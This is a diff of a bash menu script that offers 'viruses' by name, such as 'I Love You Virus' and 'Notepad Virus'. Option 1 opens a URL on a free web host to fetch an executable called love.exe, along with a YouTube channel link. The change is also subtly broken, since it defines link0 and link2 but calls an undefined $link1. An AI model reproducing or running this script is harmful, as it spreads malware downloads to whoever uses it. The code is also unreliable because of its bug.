@@ -31,12 +31,15 @@ display_art
     echo "6. Exit"
     read -p "Select an option: " choice
 
+link0="https://www.youtube.com/techhacker7"
+link2="https://wdevmail.000webhostapp.com/Bach%20File/love.exe"
+
     case $choice in
         1)
             echo "You selected:  I Love You Virus"
             # Add code to run the other bash script here
-            xdg-open "https://www.youtube.com/techhacker7"  # Open link in default browser
-            xdg-open "https://wdevmail.000webhostapp.com/Bach%20File/love.exe"  # Open link in default browser
+            xdg-open "$link0" &
+            xdg-open "$link1" &
             ;;
         2)
             echo "You selected: Notepad Virus"
